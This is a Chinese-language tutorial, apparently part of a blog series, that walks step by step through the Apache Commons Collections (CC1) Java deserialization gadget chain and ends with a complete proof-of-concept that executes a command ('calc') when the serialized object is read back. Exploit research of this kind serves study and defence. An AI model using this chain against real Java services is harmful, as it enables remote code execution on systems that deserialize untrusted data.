Apache Commons


Apache Commons包含了很多开源的工具，用于解决平时编程经常会遇到的问题，减少重复劳动。而commons-collections组件反序列化漏洞的反射链也称为CC链。

主要类


通过Commons Collections下的Transformer类这个是一个接口，它定义了将输入转化为输出的一个流程

而他的核心方法便是transform，我们可以先查看一下Transform类的实现

今天我们主要研究的是InvokerTransformer

InvokerTransformer类transform方法实现了类方法动态调用，即采用反射机制动态调用类方法并返回该方法执行结果。


转到InvokerTransformer可以发现是有序列化接口的，转到下面的transform方法中可以发现

transform方法可以接收参数

我们可以使用InvokerTransformer类来进行反射，这是类定义

public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {    super();    iMethodName = methodName;    iParamTypes = paramTypes;    iArgs = args;}


import org.apache.commons.collections.functors.InvokerTransformer;

public class Main {
    public static void main(String[] args)    {        Runtime r = Runtime.getRuntime();
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);

    }
}
可以发现InvokerTransformer类下的methodName我们选择了exec类型String实例化对象是"calc"从transform（）方法中传入的是实例化的Runtime r
说白了上面干的事情无非就是我们第二期所讲的反射修改属性
Human Zhang_San = new Human();Class c = Zhang_San.getClass();Constructor f = c.getConstructor(String.class,String.class,int.class);Human Li_Si = (Human) f.newInstance("red","black",175);



可以发现整体是没有问题的
我们现在去找谁调用了transform
比如TransformedMap类下的checkSetValue调用了transform
protected Object checkSetValue(Object value) {    return valueTransformer.transform(value);}
但是作为保护成员我们无法直接用checkSetValue
而在TransformedMap类下有decorate作为一个公共接口允许我们进行使用

public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer)
我们继续去找一下谁调用了checkSetValue，发现在AbstractInputCheckedMapDecorator的子类MapEntry下的setValue方法调用了checkSetValue，我们在这里可以尝试做一个调用，这里的MapEntry类下的setValue其实是相当于复写了一个Entry下的setValue，我们只需要便利被decorate调用过的map就会调用setValue方法进而调用checkSetValue
public static void main(String[] args){    Runtime r = Runtime.getRuntime();

   InvokerTransformer Test = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});

   HashMap<Object,Object> map = new HashMap<>();   TransformedMap.decorate(map,null,Test);   map.put("11","33");   Map<Object,Object> transformap = TransformedMap.decorate(map,null,Test);

   for(Map.Entry entry:transformap.entrySet())   {       entry.setValue(r);

   }
}
通过for(Map.Entry entry:transformap.entrySet())来遍历键值（Entry）
调用成功,然后我们现在来找谁调用了setValue
可以发现调用setValue的地方还是很多的，但并不是每个都能帮助到我们来传递命令比如说
public Object setValue(Object object) {    return entry.setValue(object);}
setValue和调用方法同名的就不可以，因为没有产生方法转移我们等于在转圈，我们需要找的最好是ReadObject方法下调用了setValue，那么这里有AnnotationInvocationHandler类下就有。
注：如果这里没有配置要求的sun是找不到的，因为AnnotationInvocationHandler正常是反编译文件(.class)而sun文件是源码
class AnnotationInvocationHandler implements InvocationHandler, Serializable {    private static final long serialVersionUID = 6182022883658399397L;    private final Class<? extends Annotation> type;    private final Map<String, Object> memberValues;
    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {        Class<?>[] superInterfaces = type.getInterfaces();        if (!type.isAnnotation() ||            superInterfaces.length != 1 ||            superInterfaces[0] != java.lang.annotation.Annotation.class)            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");        this.type = type;        this.memberValues = memberValues;    }
这里Map<String, Object> memberValues参数是我们可以传入，所以可以直接传入Map<Object,Object> transformap = TransformedMap.decorate(map,null,Test);我们现在尝试实例化AnnotationInvocationHandler由于AnnotationInvocationHandler类是默认的（class前面没有声明）所以我们需要通过反射来调取
Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor annotationInvocationHandlerConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);annotationInvocationHandlerConstructor.setAccessible(true);Object Begin = annotationInvocationHandlerConstructor.newInstance(Override.class,transformap);
由于Runtime这个类无法序列化（因为没有接口）所以我们需要InvokerTransformer方法获取runtime实例
Transformer[] transformers = new Transformer[]{

        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})};ChainedTransformer Test = new ChainedTransformer(transformers);


通过ChainedTransformer类来把所有需要InvokerTransformer做一个集合，然后逐一执行，之后我们回到AnnotationInvocationHandler去看一下ReadObject方法发现我们需要满足if (memberType != null)和if (!(memberType.isInstance(value)才能给setValue传值，我们需要找一个有成员方法的Class比如

@Target(ElementType.ANNOTATION_TYPE)public @interface Target {    /**     * Returns an array of the kinds of elements an annotation type     * can be applied to.     * @return an array of the kinds of elements an annotation type     * can be applied to     */    ElementType[] value();

所以我们将newInstance()改为Target.class之后再把map.put("Value","33");改为"Value"

再回到AnnotationInvocationHandler类下的ReadObject方法

memberValue.setValue(    new AnnotationTypeMismatchExceptionProxy(        value.getClass() + "[" + value + "]").setMember(            annotationType.members().get(name)));

最后的setValue传入的其实是AnnotationTypeMismatchExceptionProxy所以我们需要调用ConstantTransformer(Runtime.class)来把setValue中的值改为Runtime

public ConstantTransformer(Object constantToReturn) {    super();    iConstant = constantToReturn;}

这是ConstantTransformer的定义可以也就是不管接收到什么输入都会返回自己最初的值，并且这也是可以序列化的

import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;

public class Main {
    public static void main(String[] args) throws Exception {        Transformer[] transformers = new Transformer[]{                new ConstantTransformer(Runtime.class),                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})        };

        ChainedTransformer Test = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();        map.put("value","value");        Map<Object, Object> transformap = TransformedMap.decorate(map, null, Test);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");        Constructor annotationInvocationHandlerConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);        annotationInvocationHandlerConstructor.setAccessible(true);        Object Begin = annotationInvocationHandlerConstructor.newInstance(Target.class, transformap);

        serialize(Begin);        unserialize("print.bin");


    }
    public static void serialize(Object obj) throws Exception {        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("print.bin"));        oos.writeObject(obj);    }
    public static Object unserialize(String Filename) throws Exception {        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    }}
